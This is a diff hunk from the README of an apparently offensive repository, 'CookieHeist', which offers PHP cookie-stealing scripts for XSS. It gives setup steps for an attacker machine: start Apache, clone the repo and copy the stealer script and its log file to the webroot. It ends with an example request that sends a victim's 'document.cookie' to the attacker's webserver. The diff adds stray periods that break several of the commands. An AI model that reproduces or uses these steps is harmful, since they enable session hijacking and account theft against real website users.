@@ -13,11 +13,11 @@ PHP Cookie Stealing Scripts for use in XSS
 1. On the remote attacker machine, start the webserver (Apache2 in example):
 sudo service apache2 start
 
-2. Git clone the repo locally and then push the chosen "Cookie stealer" PHP script from local host to the attacking machine.
-git clone https://github.com/RxSec/CookieHeist
-cd CookieHeist
-sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/
-sudo scp cookielog.txt username@AttackMachine:/var/www/html/
+2. Git clone the repo locally and then push the chosen "Cookie stealer" PHP script from local host to the attacking machine.  
+git clone https://github.com/RxSec/CookieHeist. 
+cd CookieHeist. 
+sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/. 
+sudo scp cookielog.txt username@AttackMachine:/var/www/html/. 
 
 Example: http://[Attacker Webserver]/cookiesteal-simple.php?c=document.cookie
 
